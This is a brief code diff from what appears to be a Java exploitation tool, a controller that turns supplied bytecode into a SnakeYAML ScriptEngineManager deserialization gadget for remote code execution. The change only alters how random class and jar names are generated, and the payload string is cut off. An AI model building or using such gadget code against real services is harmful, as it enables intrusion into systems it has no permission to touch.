@@ -24,8 +24,8 @@ public class SnakeYamlController extends BasicController {
     public Object process(byte[] byteCode) throws Exception {
         System.out.println("[Reference] Factory: BeanFactory + SnakeYaml");
 
-        String factoryClassName = MiscUtil.getRandStr(12);
-        String jarName = MiscUtil.getRandStr(12);
+        String factoryClassName = MiscUtil.getClassName();
+        String jarName = MiscUtil.getRandStr(8);
 
         String code = JavaScriptPayload.loadClass(byteCode);
         String yaml = "!!javax.script.ScriptEngineManager [\n" +
